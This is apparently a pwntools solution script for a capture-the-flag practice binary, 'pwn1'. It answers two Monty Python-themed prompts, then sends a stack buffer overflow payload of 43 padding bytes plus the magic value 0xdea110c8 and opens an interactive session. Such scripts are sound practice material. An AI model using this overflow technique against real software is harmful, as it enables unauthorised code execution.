from pwn import *

elf = context.binary = ELF("./pwn1")

p = process()


p.recvline()
p.sendline("Sir Lancelot of Camelot")
p.recvline()
p.sendline("To seek the Holy Grail.")
p.recvline()

# gdb.attach(p)
payload = flat([43 * b"A" , 0xdea110c8])

p.sendline(payload)

p.interactive()

